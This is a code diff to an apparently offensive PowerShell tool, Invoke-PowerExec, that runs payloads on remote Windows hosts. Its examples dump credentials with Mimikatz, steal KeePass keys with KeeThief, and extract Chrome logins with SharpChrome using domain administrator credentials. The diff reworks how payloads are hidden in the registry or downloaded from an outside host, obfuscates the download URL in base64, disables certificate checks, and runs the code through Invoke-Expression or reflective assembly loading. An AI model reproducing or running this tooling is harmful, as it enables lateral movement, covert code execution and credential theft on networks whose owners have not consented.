@@ -34,7 +34,7 @@
     PS C:\> Invoke-PowerExec -Type PSScript -File .\Invoke-Mimikatz.ps1 -Arguments 'Invoke-Mimikatz -DumpCreds' -Hosts '192.168.0.1'
 
 .EXAMPLE
-    PS C:\> Invoke-PowerExec -Type PSScript -URL 'http://192.168.0.10/KeeThief.ps1' -Arguments 'Get-KeePassDatabaseKey' -Hosts '192.168.0.1','192.168.0.2' -Credential ADATUM\Administrator
+    PS C:\> Invoke-PowerExec -Type PSScript -URL 'https://github.com/HarmJ0y/KeeThief/raw/master/PowerShell/KeeThief.ps1' -Arguments 'Get-KeePassDatabaseKey' -Hosts '192.168.0.1','192.168.0.2' -Credential ADATUM\Administrator
 
 .EXAMPLE
     PS C:\> Invoke-PowerExec -Type NETAssembly -File .\SharpChrome.exe -Arguments 'logins','/unprotect','/format:table' -Hosts $(gc hosts.txt) -Credential ADATUM\Administrator
@@ -68,8 +68,13 @@
 		$Credential = [System.Management.Automation.PSCredential]::Empty
 	)
 
-	$EncArgs = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Arguments))
-	$Arguments = ($Arguments -join "','")
+	If($Type -eq 'PSScript') {
+		$EncArgs = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Arguments))
+		$RunScript = '$EncArgs = ' + "'$EncArgs'" + '; [System.Text.Encoding]::UTF8.GetString($Code) | Invoke-Expression; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncArgs)) | Invoke-Expression; '
+	} ElseIf($Type -like 'NETAssembly') {
+		$Arguments = ($Arguments -join "','")
+		$RunScript = '$Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = ' + "'$Arguments'" + '; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray()); '
+	}
 
 	If ($File) {
 		# Registry settings used to store the payload
@@ -82,11 +87,7 @@
 
 		# Script used to retrieve and run the payload
 		$Script = '$EncCode = (Get-ItemProperty -Path ' + "'$RegistryPath'" + ').' + "'$RegKey'" + '; $Code = [System.Convert]::FromBase64String($EncCode); '
-		If($Type -eq 'PSScript') {
-			$Script = $Script + '$EncArgs = ' + "'$EncArgs'" + '; [System.Text.Encoding]::UTF8.GetString($Code) | Invoke-Expression; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncArgs)) | Invoke-Expression'
-		} ElseIf($Type -like 'NETAssembly') {
-			$Script = $Script + '$Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = ' + "'$Arguments'" + '; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
-		}
+		$Script = $Script + $RunScript
 
 		ForEach($ComputerName in $Hosts) {
 			# Upload the payload
@@ -98,12 +99,9 @@
 		}
 	} ElseIf ($URL) {
 		# Script used to download and run the payload
-		$Script = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object Net.WebClient; $client.Proxy = [Net.WebRequest]::GetSystemWebProxy(); $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials; '
-		If($Type -eq 'PSScript') {
-			$Script = $Script + '$EncArgs = ' + "'$EncArgs'" + '; $Code = $client.DownloadString("' + $URL + '"); $Code | Invoke-Expression; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($EncArgs)) | Invoke-Expression'
-		} ElseIf($Type -like 'NETAssembly') {
-			$Script = $Script + '$Code = $client.DownloadData(' + "'$URL'" + '); $Assembly = [Reflection.Assembly]::Load([byte[]]$Code); $al = New-Object -TypeName System.Collections.ArrayList; [string[]]$xargs = ' + "'$Arguments'" + '; $al.add($xargs) | Out-Null; $Assembly.EntryPoint.Invoke($null, $al.ToArray());'
-		}
+		$EncUrl = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($URL))
+		$Script = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = [System.Net.WebRequest]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(' + "'$EncUrl'" + '))); $client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy(); $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials; $Response = $client.GetResponse(); $RespStream = $Response.GetResponseStream(); $Buffer = New-Object byte[] $Response.ContentLength; $WriteStream = New-Object System.IO.MemoryStream $Response.ContentLength; Do {$BytesRead = $RespStream.Read($Buffer, 0, $Buffer.Length); $WriteStream.Write($Buffer, 0, $BytesRead)} While ($BytesRead -gt 0); $Code = New-Object byte[] $Response.ContentLength; [Array]::Copy($WriteStream.GetBuffer(), $Code, $Response.ContentLength); '
+		$Script = $Script + $RunScript
 
 		ForEach($ComputerName in $Hosts) {
 			# Execute the payload
